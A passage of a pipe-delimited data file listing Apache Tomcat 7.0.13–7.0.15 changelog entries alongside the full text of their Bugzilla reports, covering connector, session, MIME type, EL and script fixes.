	org.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:302)
	java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
	java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
	java.lang.Thread.run(Thread.java:662)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=51277
Catalina|Tomcat 7.0.15 (markt)|fix|51278|Allow ServletContainerInitializers to override settings in the global default web.xml and the host web.xml. (markt)|Unable to override default servlet other than in main web.xml|The default web.xml gets merged into the application's web.xml before processing of fragments, annotations and ServletContextInitializers. This means it can only be overridden in the application's web.xml. It should be possible to override in fragments, annotations and ServletContextInitializers.|https://bz.apache.org/bugzilla/show_bug.cgi?id=51278
Catalina|Tomcat 7.0.15 (markt)|fix|51310|When stopping the Server object on shutdown call destroy() after calling stop(). (markt)|Connector destroyInternal Execution|In Tomcat 7.0.12 Connector#destroyInternal method has never been called while server is under shutdown. Therefore NIOBlockingSelector#close is never called. Is it bug or else?|https://bz.apache.org/bugzilla/show_bug.cgi?id=51310
Coyote|Tomcat 7.0.15 (markt)|add|51145|Add an AJP-NIO connector. (markt/rjung)|Need a NIO-based AJP connector|"One of the major changes in Tomcat 7 is that it supports the Servlet 3.0 specification.  A major part of the Servlet 3.0 specification is obviously the support for asynchronous requests.

Some of us need to use Apache and mod_jk to provide load balancing over multiple Tomcats.  This means using the AJP connector, which currently has only BIO and APR options.  For those of us needing to support many (7) different platforms (some with horrific linkers, etc), APR is just not a workable solution -- too many nasty builds.

For such use cases a NIO-based AJP connector would really be enormously helpful.

Mark Thomas stated, ""I don't know how much work that would be to write but
with the refactoring already completed for Tomcat 7 it might be as
little as 1000 lines of code."""|https://bz.apache.org/bugzilla/show_bug.cgi?id=51145
Jasper|Tomcat 7.0.15 (markt)|add|51220|Add a system property to enable tag pooling with JSPs that use a custom base class. Based on a patch by Dan Mikusa. (markt)|Add system property that makes it possible for jsp pages with the extends page directive to take advantage of tag pooling|"Created attachment 27022 [details]
Patch file

I would like to propose that a system property be added which would allow a JSP page that uses the extends page directive to take advantage of tag pooling.

Patch file included."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51220
Jasper|Tomcat 7.0.15 (markt)|add||Include a comment header in generated java files that indicates when the file was generated and which version of Tomcat generated it. (markt)|||
Jasper|Tomcat 7.0.15 (markt)|fix|51240|Ensure that maxConnections limit is enforced when multiple acceptor threads are configured. (markt)|maxConnections not honors config when acceptorThreadCount > 1|"When acceptorThreadCount > 1, maxConnections not honors config, this affects BIO & NIO connector (others don't know).

---------- test config begin --------

    <Executor name=""tomcatThreadPool"" namePrefix=""catalina-exec-"" 
        maxThreads=""300"" minSpareThreads=""4""/>
    
    <Connector port=""9993""
               protocol=""org.apache.coyote.http11.Http11Protocol""
               URIEncoding=""ISO-8859-1""
               enableLookups=""false""

               acceptorThreadCount=""2""
               executor=""tomcatThreadPool""
               acceptCount=""1""
               maxConnections=""1""
               />

    <Connector port=""9994""
               protocol=""org.apache.coyote.http11.Http11NioProtocol""
               URIEncoding=""ISO-8859-1""
               enableLookups=""false""

               acceptorThreadCount=""2""
               executor=""tomcatThreadPool""
               acceptCount=""1""
               maxConnections=""1""
               />

---------- test config end ----------

---- Test-1 (acceptorThreadCount=""1"") --- OK ---
  $ ab2 -n 20000 -c 1000 http://localhost:999x/
  $ netstat -atn | grep :999x | grep ESTABLISHED

  This show range 3-5 connections (acceptable number)

---- Test-2 (acceptorThreadCount=""2"") --- KO ---
  $ ab2 -n 20000 -c 1000 http://localhost:999x/
  $ netstat -atn | grep :999x | grep ESTABLISHED

  This show +100 connections > ""OOPS"", too much far

----

Logs show traces like this when socket closes:
----- catalina.out begin -----
May 22, 2011 9:10:51 PM org.apache.tomcat.util.net.AbstractEndpoint countDownConnection
WARNING: Incorrect connection count, multiple socket.close called on the same socket.
----- catalina.out end -------"|https://bz.apache.org/bugzilla/show_bug.cgi?id=51240
Cluster|Tomcat 7.0.15 (markt)|fix|51230|Add missing attributes to JMX for ReplicationValve and JvmRouteBinderValve. Patch provided by Eiji Takahashi. (markt)|Some jmx attributes of ReplicationValve and JvmRouteBinderValve are unavailable|"Created attachment 27032 [details]
patch for mbean-descriptor

asyncSupported and doProcessingStats(ReplicationValve only) are unavailable.
I made the patch for this issue.

Regards."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51230
Web applications|Tomcat 7.0.15 (markt)|add||Add documentation for AJP-NIO connector. (markt/rjung)|||
Web applications|Tomcat 7.0.15 (markt)|fix|51182|Document JAAS supported added in 51119. Patch provided by Neil Laurance. (markt)|Update to listeners.xml documentation to describe changes for 51119|"Created attachment 26982 [details]
Patch of trunk - affects listeners.xml only

Related to 51119

Update to listeners.xml documentation to describe file-based and JAAS based authentication and authorisation with JMXRemoteLifecyleListener.

Also general tidy up of this page."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51182
Web applications|Tomcat 7.0.15 (markt)|fix|51225|Fix broken documentation links for non-English locales in the HTML Manager application. Patch provided by Eiji Takahashi. (markt)|The link for Manager help is broken in Japanese locale|"Created attachment 27028 [details]
patch for LocalStrings_xx.properties

If I start a Tomcat7 in Japanese locale, the link for Manager helps on Manager webapp is broken.

In Japanese locale, htmlManagerServlet.helpHtmlManagerFile and htmlManagerServlet.helpManagerFile don't start with ""../docs/"".
This issue occurs in German and Spanish locale.

Regards."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51225
Web applications|Tomcat 7.0.15 (markt)|fix|51229|Fix bugs in the Servlet 3.0 asynchronous examples. Patch provided by Eiji Takahashi. (markt)|Some async examples are not work correctly|"Created attachment 27031 [details]
patch for async examples

Async0: The code that is befind complete() is  not executed.

StockTicker: The link for StockTicker is wrong.

Regards."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51229
Web applications|Tomcat 7.0.15 (markt)|fix|51251|Add web application version support to the Ant tasks. Based on a patch provided by Eiji Takahashi. (markt)|Patch to add version parameter to ant task|"Created attachment 27049 [details]
add version support

Add version parameter support to the following ant tasks.
- StartTask
- StopTask
- ReloadTask
- UndeployTask
- SessionsTask (also idle parameter)

Regards."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51251
Web applications|Tomcat 7.0.15 (markt)|fix|51294|Clarify behaviour of unpackWAR attribute of StandardContext components. (markt)|Since 7.0.12 do not work option unpackWARs=true for WARs outside appBase|"In 7.0.12 was added in Changelog this line:
--
Don't unpack WAR files if they are not located in the Host's appBase. (markt)
--
It's change method of deployment from older versions of Tomcat (5.5, 6.0, 7.0.11) and forced to change logics on early configured servers.

May be need to add new parameter like 'unpackExternalWARs=true' to be able to configure this? (Why outside WARs is worse than inside?)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=51294
Other|Tomcat 7.0.15 (markt)|fix|46451|Configure svn:bugtraq properties for Tomcat trunk. Based on a patch provided by Marc Guillemot. (markt)|Configure svn:bugtraq properties|"Created attachment 23064 [details]
Patch adding the missing SVN properties on project's root

SVN bugtraq properties may be helpful to link commits with issue ids and are supported by different SVN clients.
See:
http://markphip.blogspot.com/2007/01/integrating-subversion-with-your-issue.html"|https://bz.apache.org/bugzilla/show_bug.cgi?id=46451
Other|Tomcat 7.0.15 (markt)|fix|51309|Correct logic in catalina.sh stop when using a PID file to ensure the correct message is shown. Patch provided by Caio Cezar. (markt)|Patch to better stop support with CATALINA_PID|"When using the CATALINA_PID variable the catalina.sh stop action verify if the PID file is empty (-s $CATALINA_PID) and after that verify if the file is a file (-f $CATALINA_PID). But if the file doesn't exist the ""test -s"" return 1 consequently the message ""\$CATALINA_PID was set but the specified file does not exist. Is Tomcat running? Stop aborted."" is never printed.

I made a patch to fix this, but what you need to do is just invert ""-s"" and ""-f"".


PATCH:
--- catalina.sh.bkp	2011-06-01 12:02:07.541350449 -0300
+++ catalina.sh	2011-06-01 12:02:37.916302955 -0300
@@ -403,19 +403,19 @@
   fi
 
   if [ ! -z ""$CATALINA_PID"" ]; then
-    if [ -s ""$CATALINA_PID"" ]; then
-      if [ -f ""$CATALINA_PID"" ]; then
+    if [ -f ""$CATALINA_PID"" ]; then
+      if [ -s ""$CATALINA_PID"" ]; then
         kill -0 `cat ""$CATALINA_PID""` >/dev/null 2>&1
         if [ $? -gt 0 ]; then
           echo ""PID file found but no matching process was found. Stop aborted.""
           exit 1
         fi
       else
-        echo ""\$CATALINA_PID was set but the specified file does not exist. Is Tomcat running? Stop aborted.""
-        exit 1
+        echo ""PID file is empty and has been ignored.""
       fi
     else
-      echo ""PID file is empty and has been ignored.""
+      echo ""\$CATALINA_PID was set but the specified file does not exist. Is Tomcat running? Stop aborted.""
+      exit 1
     fi
   fi"|https://bz.apache.org/bugzilla/show_bug.cgi?id=51309
Catalina|Tomcat 7.0.14 (markt)|update||Stylistic improvements to MIME type sync script. Based on a patch provided by Felix Schumacher. (rjung)|||
Catalina|Tomcat 7.0.14 (markt)|fix||Ensure that the SSLValve provides the SSL key size as an Integer rather than a String. (markt)|||
Catalina|Tomcat 7.0.14 (markt)|fix||Ensure that the RemoteIpValve works correctly with Servlet 3.0 asynchronous requests. (markt)|||
Catalina|Tomcat 7.0.14 (markt)|fix||Use safe equality test when determining event type in the MapperListener. (markt)|||
Catalina|Tomcat 7.0.14 (markt)|fix||Use correct class loader when loading Servlet classes in StandardWrapper. (markt)|||
Catalina|Tomcat 7.0.14 (markt)|add||Provide additional configuration options for the RemoteIpValve and RemoteIpFilter to allow greater control over the values returned by ServletRequest#getServerPort() and ServletRequest#getLocalPort() when Tomcat is behind a reverse proxy. (markt)|||
Catalina|Tomcat 7.0.14 (markt)|fix||Ensure session cookie paths end in / so that session cookies created for a context with a path of /foo do not get returned with requests mapped to a context with a path of /foobar. (markt)|||
Jasper|Tomcat 7.0.14 (markt)|fix|51177|Ensure Tomcat's MapElResolver always returns Object.class for getType() as required by the EL specification. (markt)|javax.el.MapELResolver getType returns class of kept object instead of Object.class|"Created attachment 26977 [details]
JSP script reproduces the bug. Uncomment lines 46, 47 to see the real problem.

Hello, 

This is observed in Tomcat 6.0.26, Java 1.6 (Netbeans 6.9.1 bundle).

The MapELResolver getType method returns the class of the kept object instead of Object.class. The Java specification says, ""If the base object is a map, [getType] returns the most general acceptable type for a value in this map"", which should mostly be Object.class.

This makes impossible, for example, 1) to set a String value to a map expression, if previously that key was mapped to an Integer; 2) if we are putting an Integer to the value which is currently the String, the Integer gets coerced to the String (according to org.apache.el.parser.AstValue implementation, see lines 153-157.)

The attached JSP script reproduces this bug.

I couldn't figure out whether it is connected with bug 44637 (seems that request was reverse to mine).

Thanks!"|https://bz.apache.org/bugzilla/show_bug.cgi?id=51177
Catalina|Tomcat 7.0.13 (markt)|fix||Correct mix-up in Realm Javadoc. (markt)|||
Catalina|Tomcat 7.0.13 (markt)|fix||Fix display of response headers in AccessLogValve. (kkolinko)|||
Catalina|Tomcat 7.0.13 (markt)|update||Implement display of multiple request headers in AccessLogValve: print not just the value of the first header, but of the all of them, separated by commas. (kkolinko)|||
Catalina|Tomcat 7.0.13 (markt)|add|50306|New StuckThreadDetectionValve to detect requests that take a long time to process, which might indicate that their processing threads are stuck. Based on a patch provided by TomLu. (slaurent)|Detect stuck threads|"Feature request : 
regularly scan worker threads and if one has been processing the same request for longer than a configurable delay, log a warning with the stack trace of that thread.
This would allow to detect very long running threads, usually the ones that are stuck in a network call or in a deadlock."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50306
Catalina|Tomcat 7.0.13 (markt)|fix|51038|Ensure that asynchronous requests are included in access logs. (markt)|No access logs for Servlet 3.0 async requests|"Access logs written by org.apache.catalina.valves.AccessLogValve are not being written for servlet 3.0 async requests.

To reproduce:
- Handle a request asynchronously by marking the servlet with @WebServlet(asyncSupported=true)
- Send some traffic and notice that nothing is being written to the access logs.

AccessLogValve.log() is called by org.apache.catalina.Context.logAccess().
From the source for version 7.0.11, in org.apache.catalina.connector.CoyoteAdapter.java, line 416:

            AsyncContextImpl asyncConImpl = (AsyncContextImpl)request.getAsyncContext();
            if (asyncConImpl != null) {
                async = true;
            } else if (!comet) {
                response.finishResponse();
                if (postParseSuccess) {
                    // Log only if processing was invoked.
                    // If postParseRequest() failed, it has already logged it.
                    ((Context) request.getMappingData().context).logAccess(
                            request, response,
                            System.currentTimeMillis() - req.getStartTime(),
                            false);
                }
                req.action(ActionCode.POST_REQUEST , null);
            }

In the async case logAccess() isn't called here. I've searched through the code and don't see logAccess() being called anywhere else, except in error cases. So, it looks like the async case is missing a call to logAccess() somewhere."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51038
Catalina|Tomcat 7.0.13 (markt)|fix|51042|Don't trigger session creation listeners when a session ID is changed as part of the authentication process. (markt)|HttpSessionListener.sessionCreated() is called a second time when user is authenticated with no matching sessionDestroyed() call.|"When my web application has a HttpSessionListener configured in its web.xml, then that classes sessionCreated() is called when a user is assigned a new session.

However, that method is *also* called when that user authenticates itself and the session is assigned a new ID (whether or not this is actually a ""new session"" can be disputed, but that's not the point of this bug).

When the session is removed (due to a timeout, for example), then a single sessionDestroyed() call is executed.

When the HttpSessionListener manages some kind of external resource, this behaviour leads to a resource leak, because sessionCreated() is called twice, while sessionRemoved() is only called once!

I'm aware of the reason for changing the session ID and (somehow) understand why sessionCreated() is called again (after all there's a new session ID), but there must be *some* way for the SessionListener to be notified that the ""old session"" no longer exists.

The same behaviour is seen in Tomcat 6.0 (and probably 5.5 as well, but I didn't test that)."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51042
Catalina|Tomcat 7.0.13 (markt)|fix|51050|Add additional common but non-standard file extension to MIME type mappings for MPEG 4 files. Based on a patch by C√©drik Lime. (markt)|MIME types for m4a & m4v files|"Created attachment 26874 [details]
Patch for additional common mpeg 4 mime types

Tomcat correctly serves MPEG 4 files with a standardized file extension of .mp4, as video/mp4.

Common but non-standard mpeg4 files also use of the extensions .m4a and .m4v, which are unknown to Tomcat and are therefore served without any ""Content-Type"" header. This behaviour leads Internet Explorer to display garbage when following a link to such a file.

This patch adds the correct MIME type for MPEG 4 files with extensions m4a, m4b, m4r and m4v. (It omits the m4p extension, which is both not widely used, and of limited interest since the data is encrypted.)

References:
http://tools.ietf.org/html/rfc4337
http://en.wikipedia.org/wiki/MPEG-4_Part_14#.MP4_versus_.M4A_filename_extensions"|https://bz.apache.org/bugzilla/show_bug.cgi?id=51050
Catalina|Tomcat 7.0.13 (markt)|add||Add some additional common JARs that do not contain TLDs or web fragments to the list of JARs to skip when scanning for TLDs and web fragments. (markt)|||
Catalina|Tomcat 7.0.13 (markt)|fix||While scanning JARs for TLDs and fragments, avoid using JarFile and use JarInputStream as in most circumstances where JARs are scanned, JarFile will create a temporary copy of the JAR rather than using the resource directly. This change significantly improves startup performance for applications with lots of JARs to be scanned. (markt)|||
Catalina|Tomcat 7.0.13 (markt)|fix||Ensure response is committed when AsyncContext#complete() is called. (markt)|||
Catalina|Tomcat 7.0.13 (markt)|add||Add a container event that is fired when a session's ID is changed, e.g. on authentication. (markt)|||
Catalina|Tomcat 7.0.13 (markt)|fix|51099|Correctly implement non-default login configurations (configured via the loginConfigName attribute) for the SPNEGO authenticator. (fhanik/markt)|SPNEGO loginConfigName does not work|"As reported by fhanik on the dev list:

2. com.sun.security.jgss.krb5.accept is not configurable
While the authenticator has the attribute loginConfigName, there seems to be a place in the code where it omits this entry.
renaming this entry in jaas.conf and setting the loginConfigName will fail to validate a ticket

The problem code is here:

            gssContext = manager.createContext(manager.createCredential(null,
                    GSSCredential.DEFAULT_LIFETIME,
                    new Oid(""1.3.6.1.5.5.2""),
                    GSSCredential.ACCEPT_ONLY));

should look like
            final GSSManager manager = GSSManager.getInstance();
            final PrivilegedExceptionAction<GSSCredential> action =
                new PrivilegedExceptionAction<GSSCredential>() {
                    public GSSCredential run() throws GSSException {
                        return manager.createCredential(null,
                                GSSCredential.DEFAULT_LIFETIME,
                                new Oid(""1.3.6.1.5.5.2""),
                                GSSCredential.ACCEPT_ONLY);
                    }
                };
            gssContext = manager.createContext(Subject.doAs(lc.getSubject(), action));||


best
Filip"|https://bz.apache.org/bugzilla/show_bug.cgi?id=51099
Catalina|Tomcat 7.0.13 (markt)|add|51119|Add JAAS authentication support to the JMXRemoteLifecycleListener. Patch provided by Neil Laurance. (markt)|extras - JmxRemoteLifecycleListener does not support JAAS based authentication and authorisation|"(Also true in Tomcat 7)

The JmxRemoteLifecycleListener does not support JAAS based authentication.

That is, when authentication is required, it only supports file based authentication."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51119
Catalina|Tomcat 7.0.13 (markt)|add|51136|Provide methods that enable the name of a Context on Context creation when using Tomcat in an embedded scenario. Based on a patch provided by David Calavera. (markt)|Allow to set the context name through Tomcat's embeded class before adding it to the host|"org.apache.catalina.startup.Tomcat creates contexts and add them to the host directly. It would be nice if we could set the name of the context before adding it to the host.

I'm including a patch that overloads the methods ""addWebapp"" and ""addContext"" to take that name as a parameter."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51136
Catalina|Tomcat 7.0.13 (markt)|fix|51137|Add additional Microsoft Office MIME type mappings. (rjung)|Please add MIME types for xslx, xslm, docx, docm since xls and doc already contained in web.xml have been replaced by these.|"Could the following MIME types be added to conf/web.xml?

docm application/vnd.ms-word.document.macroEnabled.12
docx application/vnd.openxmlformats-officedocument.wordprocessingml.document
dotx application/vnd.openxmlformats-officedocument.wordprocessingml.template
potm application/vnd.ms-powerpoint.template.macroEnabled.12
potx application/vnd.openxmlformats-officedocument.presentationml.template
ppam application/vnd.ms-powerpoint.addin.macroEnabled.12
ppsm application/vnd.ms-powerpoint.slideshow.macroEnabled.12
ppsx application/vnd.openxmlformats-officedocument.presentationml.slideshow
pptm application/vnd.ms-powerpoint.presentation.macroEnabled.12
pptx application/vnd.openxmlformats-officedocument.presentationml.presentation
xlam application/vnd.ms-excel.addin.macroEnabled.12
xlsb application/vnd.ms-excel.sheet.binary.macroEnabled.12
xlsm application/vnd.ms-excel.sheet.macroEnabled.12
xlsx application/vnd.openxmlformats-officedocument.spreadsheetml.sheet
xltm application/vnd.ms-excel.template.macroEnabled.12
xltx application/vnd.openxmlformats-officedocument.spreadsheetml.template"|https://bz.apache.org/bugzilla/show_bug.cgi?id=51137
Catalina|Tomcat 7.0.13 (markt)|add||Partial sync of MIME type mapping with mime.types from the Apache web server. About 600 MIME types added, some changed. (rjung)|||
Catalina|Tomcat 7.0.13 (markt)|fix||Make access logging more robust when logging requests that generate 400 responses since the request object is unlikely to be fully/correctly populated in that case. (markt)|||
Coyote|Tomcat 7.0.13 (markt)|fix|50957|Fix regression in HTTP BIO connector that triggered errors when processing pipe-lined requests. (markt)|Blocking IO can serve wrong response data|"Tomcat: 7.0.8
OS:  Windows 2008 Server (x64)

Compression enabled on both HTTP and HTTPS connectors.

When using standard blocking IO HTTP/1.1 over a period of 2+ days under moderate traffic, Tomcat 7 will begin to occasionally serve the incorrect responses for a request.

Incorrect responses span a variety behaviors
* Serving a javascript (.js) file instead of HTML or Image
* Serving the wrong image
* Serving a .css file instead of HTML, javascript file, or Image

This behavior has been observed in both HTTP & HTTPS.

Another observation is that if the wrong response is served, the response is at least for something that was also requested and not something random.


Once the behavior was detected, I used WebScarab as a proxy to monitor the entire Browser <--> Tomcat conversation.  I was able to confirm a scenario like the following:
--------
ImageA.gif
ImageB.gif

Each has different file size, ETAG, etc.

GET ImageB.gif returned ImageA.gif (with ImageA.gif's ETAG, headers, binary content, and content size)
-------

This report corroborates another report discovered in the wild:
http://www.apacheserver.net/q11460/Tomcat-serving-wrong-content

In the above report, the person requested a page and received an image.

No reproduction steps have been identified to trigger this condition.  The only thing the above reporter & I noticed is that Tomcat needs to be up for a while and serve traffic throughout that period.  Once the condition has been established it is still seemingly random when it occurs.

Whenever it begins to happen, however, disable caching & keep reloading an image-heavy page until you see obvious misplaced images or other things. Using a debugging proxy will allow you to verify that incorrect content is served.

Switching to NIO appears to bypass the problem or at least NIO does not exhibit the same behavior.  As the other reporter had noted, restarting Tomcat will clear the condition.  

My hypothesis is that there is some condition within Tomcat & Blocking IO where a series of (pipelined?) requests (images, css, js) spawned from a page can become confused resulting in swapped responses (A <--> B) or duplicated responses (A & A).  Maybe some output buffer is getting clobbered.  Based upon Http11Processor, pipelined requests are constrained to the same Socket so I do not believe there is a risk of swapping responses across users.  It is unknown if this bug could be deliberately exploited in some way.


Needless to say, a server that is serving incorrect content justifies a very serious severity rating. I would not recommend using BIO in any Production environment for the time being."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50957
Coyote|Tomcat 7.0.13 (markt)|fix|50158|Ensure the asynchronous requests never timeout if the timeout is set to zero or less. Based on a patch provided by Chris. (markt)|Tomcat7.0.4 ROOT BUG|"Recent projects encountered a BUG with Tomcat7.0.4
   When a single operating system and start when the two TOMCAT. TOMCAT's ROOT directory for each deployment of a PROJECT,
   At the same time using two different IE or FIREFOX to access the application, the test found that two applications of the session will be conflicts! When an application log, the other
   Session of an application will fail, and when another application log, the first session of an application will be invalid.
   Test environment:
    Operating System: Centos5
    Client: At the same tests using IE or firefox the same time with the test. If a use IE, another application with firefox. The problem does not occur
    Server: TOMCAT7.0.4"|https://bz.apache.org/bugzilla/show_bug.cgi?id=50158
Coyote|Tomcat 7.0.13 (markt)|fix|51073|Throw an exception and do not start the APR connector if it is configured for SSL and an invalid value is provided for SSLProtocol. (markt)|Misconfigured SSLProtocol with an AprEndpoint silently falls back to ALL|"When configuring tomcat with an SSL Connector with an AprEndpoint (using the Http11AprProtocol) if you misconfigure the SSLProtocol, the it silently falls back to ""all"" which can be very dangerous.

For example this configuration may seem convincing:
<Connector 
	protocol=""org.apache.coyote.http11.Http11AprProtocol""
	SSLEnabled=""true""
	port=""443""
	scheme=""https""
	secure=""true""
	...Other SSL configuration...
	SSLProtocol=""-ALL +SSLv3 +TLSv1"" 
	.../>
	
The Documentation states valid values for the SSL protocol, but if the values don't line up exactly it defaults to ""ALL""
http://tomcat.apache.org/tomcat-7.0-doc/config/http.html#SSL%20Support 
SSLProtocol: 'Protocol which may be used for communicating with clients. The default is ""all"", with other acceptable values being ""SSLv2"", ""SSLv3"", ""TLSv1"" and ""SSLv2+SSLv3"".'

Misconfiguration of an SSLProtocol should never silently fall back to enabling all protocols.  At minimum, misconfiguration of this value should result in logged error messages.  Since SSLv2 is vulnerable to several attacks known to have some serious security flaws even allowing the possibility of man-in-the-middle attacks, I think a misconfiguration should cause the connector to fail.

@See http://svn.apache.org/repos/asf/tomcat/trunk/java/org/apache/tomcat/util/net/AprEndpoint.java

I think that ""all"" should be specifically allowed (along with """" or null), and all other unexpected values should fail loudly."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51073
Coyote|Tomcat 7.0.13 (markt)|fix||Align all the connector implementations with the documented default setting for processorCache of 200. This changes the default from -1 (unlimited) for the AJP-BIO, AJP-APR and HTTP-APR connectors. Additional information was also added to the documentation on how to select an appropriate value.|||
Coyote|Tomcat 7.0.13 (markt)|fix||Take account of time spent waiting for a processing thread when calculating connection and keep-alive timeouts for the HTTP BIO connector. (markt)|||
Coyote|Tomcat 7.0.13 (markt)|fix|51095|Don't trigger a NullPointerException when the SSL handshake fails with the HTTP-APR connector. Patch provided by Mike Glazer. (markt)|NPE in AprEndpoint.java|"Created attachment 26917 [details]
Patch to AprEndpoint.java

OVERVIEW:

In all of the most recent versions of Tomcat 7, including Trunk. When running with APR SSL and the site is accessed using an improper SSL handshake, then a SEVERE NullPointerException will is logged into catalina.out.


STEPS TO REPRODUCE:

It's pretty easy to test this, just type the following:


curl http://localhost:8444/

Where 8444 is the port that SSL is running on for Tomcat 7. 

ACTUAL RESULTS:

If you look in the catalina.out when you do this, you'll see the following stack trace and error message:

Apr 20, 2011 1:55:32 AM org.apache.coyote.http11.Http11AprProtocol$Http11ConnectionHandler process
SEVERE: Error reading request, ignored
java.lang.NullPointerException
	at org.apache.coyote.http11.Http11AprProcessor.process(Http11AprProcessor.java:208)
	at org.apache.coyote.http11.Http11AprProtocol$Http11ConnectionHandler.process(Http11AprProtocol.java:322)
	at org.apache.tomcat.util.net.AprEndpoint$SocketWithOptionsProcessor.run(AprEndpoint.java:1670)
	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
	at java.lang.Thread.run(Thread.java:662)
Exception in thread """"http-apr-8444""-exec-2727"" java.lang.NullPointerException
	at org.apache.tomcat.util.net.AprEndpoint$SocketWithOptionsProcessor.run(AprEndpoint.java:1673)
	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)



EXPECTED RESULTS:

The expected behavior is for Tomcat to not generate a NullPointerException when someone improperly accesses the SSL port.

BUILD INFO:

Taken from the latest subversion trunk, 1095243.

I've attached a patch that fixes this."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51095
Coyote|Tomcat 7.0.13 (markt)|fix||Improve handling in AJP connectors of the case where too large a AJP packet is received. (markt)|||
Coyote|Tomcat 7.0.13 (markt)|fix||Restore the automatic disabling of HTTP keep-alive with the BIO connector once 75% of the processing threads are in use and make the threshold configurable. (markt)|||
Coyote|Tomcat 7.0.13 (markt)|fix||Make pollerSize and maxConnections synonyms for the APR connectors since they perform the same function. (markt)|||
Coyote|Tomcat 7.0.13 (markt)|fix||Use maxThreads rather than 10000 as the default maxConnections for the BIO connectors. (markt)|||
Jasper|Tomcat 7.0.13 (markt)|fix|47371|Correctly coerce the empty string to zero when used as an operand in EL arithmetic. Patch provided by gbt. (markt)|EL expression parser error when getter methed return an empty string|"There is a jsp file called test.jsp:
<%@ page contentType=""text/html; charset=UTF-8"" %>
<jsp:directive.page import=""java.util.Map""/>
<jsp:directive.page import=""java.util.HashMap""/>
<%!public class CellAttributes{
	private String cellValue;

	public CellAttributes(String cellValue) {
		this.cellValue = cellValue;
	}
	public String getCellValue() {
		return cellValue;
	}
} %>
<%Map<String,CellAttributes> currentRow = new HashMap<String, CellAttributes>();

currentRow.put(""a"",new CellAttributes(""""));
currentRow.put(""b"",new CellAttributes(""1""));
pageContext.setAttribute(""currentRow"",currentRow);

%>
<Html>
<BODY>
${currentRow['a'].cellValue+currentRow['b'].cellValue}
</BODY>
</Html>

throws exceptionÔºö
java.lang.NumberFormatException: For input string: """"
	java.lang.NumberFormatException.forInputString(NumberFormatException.java:48)
	java.lang.Long.parseLong(Long.java:424)
	java.lang.Long.<init>(Long.java:671)
	org.apache.el.lang.ELArithmetic$LongDelegate.coerce(ELArithmetic.java:186)
	org.apache.el.lang.ELArithmetic.coerce(ELArithmetic.java:357)
	org.apache.el.lang.ELArithmetic.add(ELArithmetic.java:235)
	org.apache.el.parser.AstPlus.getValue(AstPlus.java:40)
	org.apache.el.ValueExpressionImpl.getValue(ValueExpressionImpl.java:186)
	org.apache.jasper.runtime.PageContextImpl.proprietaryEvaluate(PageContextImpl.java:935)
	org.apache.jsp.new_jsp._jspService(new_jsp.java:84)
	org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)
	javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
	org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:374)
	org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:342)
	org.apache.jasper.servlet.JspServlet.service(JspServlet.java:267)
	javax.servlet.http.HttpServlet.service(HttpServlet.java:717)

but I think it should be ""1"""|https://bz.apache.org/bugzilla/show_bug.cgi?id=47371
Jasper|Tomcat 7.0.13 (markt)|add||Label JSP/tag file line and column numbers when reporting errors since it may not be immediately obvious what the numbers represent. (markt)|||
Jasper|Tomcat 7.0.13 (markt)|fix||Correct a regression in the fix for 49916 that resulted in JSPs being compiled twice rather than just once. (markt)|use an init-param for jspFile on explicit jsp servlets|"Created attachment 26017 [details]
patch to translate jsp-file elements to jspServlet init params

A <servlet> element in web.xml can include a jsp-file rather than a servlet class. Currently in catalina and jasper this is handled by a bunch of runtime code that tracks the jsp file outside the servlet and feeds it to the servlet as a request attribute.  This requires a bunch of runtime code, some of which is marked ""hold your nose"".

Instead, it's possible to supply the jsp-file as an init-param to the jsp servlet instance that is set up to handle this <servlet> element.  This makes runtime handling of these jsp servlets identical to all other servlets and transfers the small amount of jsp-aware code still needed in catalina to the deployment phase.

The attached patch appears to pass all the tomcat tests and doesn't appear to cause any tck problems in the geronimo-tomcat integration.

In this patch, JspServlet will still respond to the jsp file as a request attribute but catalina won't send it.  Thus jasper is backwards compatible with earlier catalina versions but catalina is not backward compatible for explicitly mentioned jsp-file in servlet elements with earlier jasper versions.

It would be helpful to geronimo to apply the JspServlet patch even if the catalina changes aren't applied as we are using this technique in the geronimo-jetty integration and are subclassing JspServlet to provide this behavior."|https://bz.apache.org/bugzilla/show_bug.cgi?id=49916
Jasper|Tomcat 7.0.13 (markt)|add||Log JARs that are scanned for TLDs where no TLD is found so that users can easily identify JARs that can be added to the list of JARs to skip. (markt)|||
Jasper|Tomcat 7.0.13 (markt)|update||Use a single TLD location cache for a web application rather than one per JSP compilation to speed up JSP compilation. (markt)|||
Jasper|Tomcat 7.0.13 (markt)|add|51124|Refactor BodyContentImpl to assist in determining the root cause of this bug. Based on a patch by Ramiro. (markt)|ArrayIndexOutOfBoundsException after setting org.apache.jasper.runtime.BodyContentImpl.LIMIT_BUFFER=true|"First of all, I know that there has been a bug regarding a similar problem before and that it was fixed. But currently this bugs occurs even with tomcat version 6.0.32.

We have a problem with the tomcat runnign with the parameter org.apache.jasper.runtime.BodyContentImpl.LIMIT_BUFFER=true.

